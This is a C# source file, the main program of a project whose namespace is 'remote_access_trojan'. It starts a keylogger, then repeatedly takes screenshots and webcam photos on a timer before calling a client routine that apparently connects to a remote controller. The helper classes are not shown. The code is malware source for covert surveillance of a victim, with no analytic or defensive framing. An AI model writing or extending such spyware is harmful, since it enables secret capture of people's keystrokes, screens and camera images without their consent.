using System;
using System.IO;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace remote_access_trojan
{
    class Program
    {
        static System.Timers.Timer timer;
        static Webcam webcam;
        static int timerCount = 1;

        static void Main(string[] args)
        {
            Keylogger.Run();
            webcam = new Webcam();
            SetTimer();

            // Do not move - this needs to be the last line
            Application.Run();
        }

        private static void SetTimer()
        {
            // Create a timer with a 20 second interval.
            timer = new System.Timers.Timer(5000);

            timer.Elapsed += OnTimerTick;
            timer.AutoReset = true;
            timer.Enabled = true;
        }

        private static void OnTimerTick(Object source, ElapsedEventArgs e)
        {
            // 2 minutes is up
            if (timerCount >= 24)
            {
                Client.newClient();
                timer.Stop();
                return;
            }

            Screenshot.takeScreenshot(timerCount);
            webcam.TakePicture(timerCount);
            Console.WriteLine("Timer Tick: " + timerCount);
            timerCount++;
        }

    }
}
